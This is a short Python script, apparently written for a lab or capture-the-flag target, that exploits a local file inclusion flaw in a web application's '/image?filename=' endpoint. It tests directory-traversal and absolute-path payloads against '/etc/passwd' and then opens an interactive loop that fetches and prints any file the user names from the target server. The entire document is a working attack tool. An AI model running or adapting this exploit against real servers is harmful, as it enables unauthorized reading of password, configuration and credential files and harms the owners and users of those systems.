import requests
import urllib3
import os 
import dotenv

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
dotenv.load_dotenv()

class LocalFile:
    def __init__(self, url):
        self.url = url.rstrip("/")
        self.exploit_url = f"{self.url}/image?filename="

    def exploit(self, format):
        if requests.get(url=f"{format}etc/passwd").status_code != 200:
            print("LFI method didn't work")
            return False
        
        print(f"Exploitation successfull\nSide note: To quit, just enter stop ദ്ദി(｡•̀ ,<)~✩‧₊")
        while True:
            try:
                payload_unfiltered = input("Enter location of file to see: ")
                if payload_unfiltered.lower() in ["quit", "stop", "exit"]:
                    return False
                if payload_unfiltered is None or payload_unfiltered == "":
                    print("Enter the location please")
                    continue
                payload = payload_unfiltered.lstrip("/")
                file_upload_result = requests.get(url=f"{format}{payload}")
                if file_upload_result.status_code != 200:
                    print("Network error. (TωT)")
                    return False
                print(file_upload_result.text)
            except KeyboardInterrupt:
                print("\n\nKeyBoard Interuption. Exiting shell...")
                break
            except EOFError:
                print("\nExiting shell...")
                break
            except Exception as e:
                print(f"Error: {e}")
        return True

        
    def simple_lfi(self):
        print("Trying simple local file inclusion")
        return(self.exploit(f"{self.exploit_url}../../../../../"))

    def absolute_path(self):
        print("Trying absolute path local file inclusion ")
        return(self.exploit(f"{self.exploit_url}/"))

    def main(self):
        exploit_methods = [
            ("simple lfi", self.simple_lfi),
            ("absolute path", self.absolute_path)
        ]
        for method_name, method in exploit_methods:
            try:
                if method():
                    print(f"Success with {method_name}")
                    print("Bye bye ˙◠˙")
                    return True
            except Exception as e:
                print(f"{method_name} failed: {e}")
                continue
            
        print("All exploits failed. Sorry you will have to search for better programmer than me. (╥﹏╥)")
        return False

while True:
    url = input("Enter the url: ")
    if url is None or url == "":
        print("Please enter the url  (>ᴗ•) !")
        continue
    else: 
        start = LocalFile(url)
        start.main()
        break
